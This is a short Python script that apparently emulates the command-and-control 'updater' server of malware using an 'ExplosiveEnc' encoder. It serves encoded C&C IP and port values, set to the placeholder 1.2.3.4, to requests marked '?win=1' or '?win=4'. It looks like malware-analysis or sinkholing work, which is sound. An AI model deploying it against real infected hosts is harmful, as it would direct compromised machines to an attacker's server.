import tornado.httpserver
import tornado.ioloop
import time
import ExplosiveEnc


CNC_IP = "1.2.3.4"
CNC_PORT = "1234"

def getUpdaterResponse(ip, port):
    """
    Get a string with a valid C&C updater response
    """
    template = """<HTML>
  <BODY>
    Default updater response
  </BODY>
  {1.2.3.4}"""

    ip_section = ""
    port_section = ""

    if ip:
        ip_section = "<IP>%s</IP>" % ExplosiveEnc.encode_conf(ip)

    if port:
        port_section = "<PORT>%s</PORT>" % ExplosiveEnc.encode_conf(port)

    template += "\n %s \n %s" % (ip_section, port_section)
    template += "\n</HTML>\n\n"

    return template

def getDefaultResponse():
    """
    Get a default web server response
    """
    return """<HTML>
  <BODY>
    Default updater response
  </BODY>
</HTML>"""


def HandleStaticUpdater(request):
    """
    Static C&C Updater Handler
    """
    print "[*] %s Got Static C&C Updater request %s" % (time.ctime(), request.uri)
    print "\t[+] Host: %s" % request.host

    message = getUpdaterResponse(CNC_IP, CNC_PORT)
    request.write("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(message), message))

def HandleDynamicUpdater(request):
    """
    Dynamic C&C Updater Handler
    """
    print "[*] %s Got Static C&C Updater request: %s" % (time.ctime(), request.uri)
    print "\t[+] Host: %s" % request.host

    message = getUpdaterResponse(CNC_IP, CNC_PORT)
    request.write("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(message), message))

def IPCheckHandler(request):
    """
    IP Check handler
    """
    print "[*] %s Got External IP Check request \ Other request: %s" % (time.ctime(), request.uri)
    print "\t[+] Host: %s" % request.host

    message = getDefaultResponse()
    request.write("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(message), message))


def handle_request(request):

    if "?win=1" in request.uri:
        HandleStaticUpdater(request)

    elif "?win=4" in request.uri:
        HandleDynamicUpdater(request)

    else:
        IPCheckHandler(request)

    request.finish()

http_server = tornado.httpserver.HTTPServer(handle_request)
http_server.listen(80)
tornado.ioloop.IOLoop.instance().start()